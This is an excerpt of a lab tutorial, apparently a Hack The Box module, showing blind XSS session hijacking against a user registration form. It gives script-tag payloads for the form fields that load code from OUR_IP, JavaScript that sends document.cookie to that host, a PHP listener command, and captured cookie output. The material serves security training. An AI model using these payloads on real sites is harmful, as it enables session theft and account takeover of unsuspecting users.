...
![User Registration form with fields for name, username, password, email, and website, and a 'Register' button.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_blind_test_form.jpg)

As we can see, once we submit the form we get the following message:

http://SERVER_IP:PORT/hijacking/index.php

![Thank you for registering. An Admin will review your registration request.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_blind_test_form_output.jpg)
...
```shellsession
aliyark145@htb[/htb]$ mkdir /tmp/tmpserver aliyark145@htb[/htb]$ cd /tmp/tmpserver aliyark145@htb[/htb]$ sudo php -S 0.0.0.0:80 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```
...
```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field <script src=http://OUR_IP/username></script> #this goes inside the username field ...SNIP...
```
...
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie; new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
...
```shellsession
10.10.10.10:52798 [200]: /script.js 10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```
...
```shellsession
aliyark145@htb[/htb]$ cat cookies.txt  Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```
